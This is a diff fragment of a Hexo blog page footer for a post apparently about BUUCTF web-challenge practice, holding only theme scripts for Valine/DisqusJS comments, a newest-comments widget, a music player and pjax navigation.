+      emojiMaps: {"tv_doge":"doge.gif","tv_亲亲":"亲亲.gif","tv_偷笑":"偷笑.gif","tv_再见":"再见.gif","tv_发怒":"发怒.gif","tv_发财":"发财.gif","tv_可爱":"可爱.gif","tv_吐血":"吐血.gif","tv_呆":"呆.gif","tv_呕吐":"呕吐.gif","tv_困":"困.gif","tv_坏笑":"坏笑.gif","tv_大佬":"大佬.gif","tv_大哭":"大哭.gif","tv_委屈":"委屈.gif","tv_害羞":"害羞.gif","tv_尴尬":"尴尬.gif","tv_微笑":"微笑.gif","tv_思考":"思考.gif","tv_打脸":"打脸.gif","tv_抓狂":"抓狂.gif","tv_抠鼻子":"抠鼻子.gif","tv_斜眼笑":"斜眼笑.gif","tv_晕":"晕.gif","tv_流汗":"流汗.gif","tv_流鼻血":"流鼻血.gif","tv_点赞":"点赞.gif","tv_生气":"生气.gif","tv_生病":"生病.gif","tv_疑问":"疑问.gif","tv_白眼":"白眼.gif","tv_睡着":"睡着.gif","tv_笑哭":"笑哭.gif","tv_腼腆":"腼腆.gif","tv_色":"色.gif","tv_调皮":"调皮.gif","tv_鄙视":"鄙视.gif","tv_闭嘴":"闭嘴.gif","tv_难过":"难过.gif","tv_馋":"馋.gif","tv_黑人问号":"黑人问号.gif","tv_鼓掌":"鼓掌.gif","2233_吃惊":"吃惊n.png","2233_大哭":"大哭.png","2233_大笑":"大笑n.png","2233_第一":"第一.png","2233_汗":"汗n.png","2233_喝水":"喝水.png","2233_困惑":"困惑n.png","2233_卖萌":"卖萌n.png","2233_怒":"怒.png","2233_吐魂":"吐魂.png","2233_委屈":"委屈.png","2233_无言":"无言.png","2233_耶":"耶.png","2233_疑问":"疑问n.png","2233_郁闷":"郁闷.png","蛆音娘_die":"die.png","蛆音娘_OK":"OK.png","蛆音娘_吃瓜群众":"吃瓜群众.png","蛆音娘_吃惊":"吃惊q.png","蛆音娘_大笑":"大笑.png","蛆音娘_肥皂":"肥皂.png","蛆音娘_扶额":"扶额.png","蛆音娘_害怕":"害怕.png","蛆音娘_哼":"哼.png","蛆音娘_滑稽":"滑稽.png","蛆音娘_机智":"机智.png","蛆音娘_哭泣":"哭泣q.png","蛆音娘_卖萌":"卖萌.png","蛆音娘_生气":"生气.png","蛆音娘_睡觉觉":"睡觉觉.png","蛆音娘_偷看":"偷看.png","蛆音娘_吐血":"吐血.png","蛆音娘_无语":"无语q.png","蛆音娘_摇头":"摇头.png","蛆音娘_疑问":"疑问.png"},
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'guobang',
+      siteName: '',
+      identifier: '2021/BUUCTF寒假刷题-Web/',
+      url: 'https://braindance.tk/2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/',
+      title: 'BUUCTF寒假刷题-Web',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'MlH1lRgc25AEM0QeHiPNOG9g4FswxAWFmhKhaW2YjrKDznnLBMwC9i3lHLJPABi3',
+      nocomment: '',
+      admin: '',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    $.getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Valine' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+    content = content.replace(/(http(s?):)([/|.|\w|\s|-])*\.(?:jpg|jpeg|gif|png|webp)/g, '') // remove image link
+    content = content.replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gi, '') // remove url
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon 
+    let defaultIcon = '?d=mp'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    for (let i = 0; i < array.length; i++) {
+      result += '<div class=\'aside-list-item\'>'
+
+      if (true) {
+        result += `<a href='${array[i].url}' class="thumbnail"><img src='${getIcon(array[i].avatar, array[i].mail)}' alt='${array[i].nick}'></a>`
+      }
+
+      result += `<div class='content'>
+      <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+      <div class='name'><span>${array[i].nick}</span><time> / ${btf.diffDate(array[i].date, true)}</time></div>
+      </div></div>`
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getValineData = () => {
+      let serverURL = ''
+      if (false) {
+        serverURL = ''
+      } else {
+        serverURL = 'https://shaenDlk.api.lncldglobal.com'
+      }
+
+    var settings = {
+      "url": `${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,
+      "method": "GET",
+      "timeout": 0,
+      "headers": {
+        "X-LC-Id": 'shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI',
+        "X-LC-Key": 'e074xMKoSw3B9kWmBediaBE9',
+        "Content-Type": "application/json"
+      },
+    }
+
+    $.ajax(settings).done((response) => {
+      var valineArray = []
+      response.results.forEach((e)=>{
+        valineArray.push({
+          'avatar': e.QQAvatar,
+          'content': changeContent(e.comment),
+          'mail': e.mail,
+          'nick': e.nick,
+          'url': e.url,
+          'date': e.createdAt,
+        })
+      })
+      
+      saveToLocal.set('leancloud-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+      generateHtml(valineArray)
+
+    }).fail(()=>{
+      const $dom = document.querySelector('#card-newest-comments .aside-list')
+      $dom.innerHTML= "无法获取资料，请确认相关配置是否正确"
+    })
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('leancloud-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getValineData()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config_change',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  $('script[data-pjax]').each(function () {
+    $(this).parent().append($(this).remove())
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  $(window).off('scroll')
+
+  //reset readmode
+  $('body').hasClass('read-mode') && $('body').removeClass('read-mode')
+
+})</script></div></body></html>
